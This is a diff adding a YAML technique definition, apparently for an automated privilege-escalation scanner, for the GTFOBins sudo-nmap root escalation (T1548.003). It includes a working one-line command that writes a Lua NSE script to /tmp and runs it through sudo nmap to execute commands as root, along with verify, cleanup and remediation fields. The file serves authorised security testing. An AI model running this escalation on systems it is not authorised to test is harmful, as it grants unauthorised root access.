@@ -1,0 +1,26 @@
+# Sudo → root via nmap (GTFOBins)
+technique: T1548.003
+name: Sudo → root via nmap (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: config-change       # drops a .nse in /tmp
+  detection: quiet
+detect:
+  sudo_allows: nmap
+execute:
+  command: |-
+    echo 'os.execute("id")' > /tmp/.f.nse && sudo nmap --script=/tmp/.f.nse
+verify:
+  success: "uid=0"
+cleanup:
+  command: |-
+    rm -f /tmp/.f.nse
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `nmap` — its --script hook loads Lua, and Lua's
+    os.execute runs shell commands as the caller (root under sudo).
+  remediation: Drop `nmap` from sudoers.
+  refs: [T1548.003, GTFOBins/nmap]
